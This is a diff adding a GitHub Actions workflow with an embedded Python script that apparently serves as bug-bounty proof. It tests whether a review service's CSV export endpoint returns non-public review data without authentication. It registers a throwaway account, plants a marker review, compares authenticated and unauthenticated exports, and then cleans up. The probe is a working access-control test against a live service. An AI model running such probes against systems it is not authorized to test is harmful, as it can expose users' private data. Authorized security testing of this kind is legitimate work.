@@ -1,0 +1,60 @@
+name: MyReviews unauth CSV export
+on:
+  push:
+    branches: [bb/mr-review-auth-20260815]
+    paths: ['.github/workflows/mr-unauth-csv-export.yml']
+permissions: {}
+jobs:
+  proof:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - name: Compare authenticated and unauthenticated export using only own review data
+        run: |
+          set -euo pipefail
+          python3 - <<'PY'
+          import hashlib,json,random,string,time,urllib.error,urllib.parse,urllib.request
+          BASE='https://myreviews.dev/v1';UA='Mozilla/5.0 Standoff365-MyReviews-csv-proof-dimion4231'
+          def R(m,p,t=None,j=None,f=None,cap=1500000):
+              h={'User-Agent':UA,'Accept':'*/*'};d=None
+              if t:h['Authorization']='Bearer '+t
+              if j is not None:h['Content-Type']='application/json';d=json.dumps(j,ensure_ascii=False).encode()
+              elif f is not None:h['Content-Type']='application/x-www-form-urlencoded';d=urllib.parse.urlencode(f).encode()
+              try:
+                  with urllib.request.urlopen(urllib.request.Request(BASE+p,headers=h,data=d,method=m),timeout=25) as r:return r.status,r.headers,r.read(cap)
+              except urllib.error.HTTPError as e:return e.code,e.headers,e.read(cap)
+              except Exception as e:print('TRANSPORT',m,p,type(e).__name__);return None,{},b''
+          def J(b):
+              try:return json.loads(b.decode('utf-8','replace'))
+              except:return None
+          def meta(lbl,s,h,b):
+              o=J(b);print(lbl,'status',s,'ctype',(h.get('Content-Type') or '').split(';')[0],'bytes',len(b),'sha',hashlib.sha256(b).hexdigest()[:12],'json_keys',sorted(o.keys()) if isinstance(o,dict) else [],'message',str(o.get('message',''))[:160] if isinstance(o,dict) else '');return o
+          rnd=''.join(random.choice(string.ascii_lowercase+string.digits) for _ in range(9));pw='Standoff!'+''.join(random.choice(string.ascii_letters+string.digits) for _ in range(20));email=f'dimin4241+csv-{rnd}@gmail.com';phone='+700'+''.join(random.choice(string.digits) for _ in range(8));reg={'email':email,'password':pw,'password_confirm':pw,'surname':'Standoff','name':'CsvProof','phone':phone}
+          s,h,b=R('POST','/user/join-by-email',j={'RegistrationForm':reg});meta('REGISTER',s,h,b);time.sleep(1.1);s,h,b=R('POST','/user/login',j={'LoginForm':{'email':email,'password':pw}});o=meta('LOGIN',s,h,b);jwt=((o or {}).get('data') or {}).get('jwt') if isinstance((o or {}).get('data'),dict) else None
+          if not jwt:raise SystemExit(0)
+          time.sleep(1.1);s,h,b=R('POST','/plan/start-demo',t=jwt,j={});meta('START_DEMO',s,h,b)
+          firm='STANDOFF-CSV-'+rnd;time.sleep(1.1);s,h,b=R('POST','/firm/create',t=jwt,j={'Firm':{'name':firm,'address':'Standoff controlled'}});fo=meta('CREATE_FIRM',s,h,b);fid=(fo or {}).get('id') if isinstance(fo,dict) else None
+          if not fid:raise SystemExit(0)
+          fid=str(fid);marker='STANDOFF CSV SECRET MARKER '+rnd
+          time.sleep(1.1);s,h,b=R('POST','/review/create?firm_id='+urllib.parse.quote(fid),f={'Review[message]':marker,'Review[rating]':'5','Review[username]':'Standoff Fixture'});meta('CREATE_OWN_REVIEW',s,h,b)
+          if s!=200:
+              R('GET','/firm/delete?id='+urllib.parse.quote(fid),t=jwt);raise SystemExit(0)
+          # Exact client route contract; use only our firm UUID. Try minimal and bounded date forms.
+          queries=[
+            [('from',''),('to',''),('service',''),('ids[]',fid)],
+            [('from','01.01.2020'),('to','31.12.2030'),('service',''),('ids[]',fid)],
+            [('from','2020-01-01'),('to','2030-12-31'),('service',''),('ids[]',fid)]
+          ]
+          confirmed=False
+          for i,pairs in enumerate(queries):
+              qs=urllib.parse.urlencode(pairs)
+              if i:time.sleep(1.1)
+              sa,ha,ba=R('GET','/firm/get-data-csv?'+qs,t=jwt);meta('AUTH_EXPORT_'+str(i),sa,ha,ba);auth_has=marker.encode() in ba or rnd.encode() in ba
+              time.sleep(1.1);su,hu,bu=R('GET','/firm/get-data-csv?'+qs);meta('UNAUTH_EXPORT_'+str(i),su,hu,bu);unauth_has=marker.encode() in bu or rnd.encode() in bu
+              print('EXPORT_COMPARE',i,'auth_marker',auth_has,'unauth_marker',unauth_has,'same_sha',hashlib.sha256(ba).digest()==hashlib.sha256(bu).digest())
+              if su==200 and unauth_has:
+                  confirmed=True;print('CONFIRMED_UNAUTHENTICATED_CSV_EXPORT_OF_OWN_NONPUBLIC_REVIEW_DATA');break
+              if sa==200 and auth_has and su in (401,403):break
+          time.sleep(1.1);s,h,b=R('GET','/firm/delete?id='+urllib.parse.quote(fid),t=jwt);meta('CLEANUP_FIRM',s,h,b)
+          if not confirmed:print('UNAUTH_CSV_EXPORT_NOT_CONFIRMED')
+          PY
